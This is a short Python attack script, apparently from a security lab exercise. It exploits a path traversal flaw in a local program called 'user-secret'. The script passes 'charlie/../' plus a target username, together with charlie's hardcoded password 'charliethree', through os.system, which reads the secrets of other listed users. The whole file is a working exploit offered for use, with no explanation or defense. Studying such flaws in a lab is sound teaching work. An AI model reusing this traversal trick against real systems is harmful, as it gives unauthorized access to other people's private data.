import os
import sys

#list of users whose secrets can be retrieved
user_list = ['alice', 'charlie', 'dennis', 'eve', 'fong']

#username must be entered while running the attack script
if len(sys.argv) != 2:
        print 'Usage: python', sys.argv[0], 'username'
else:
        #charlie's password is known
        charlie_passwd = 'charliethree'
        user_input = sys.argv[1].strip()
        if user_input in user_list:
                #execute user-secret with charlie/../user_input as the username and charliethree as the correct password
                command = '/home/bob/Public/user-secret charlie/../' + user_input + ' ' + charlie_passwd
                os.system(command)
        else:
                print 'User', user_input, 'not found.'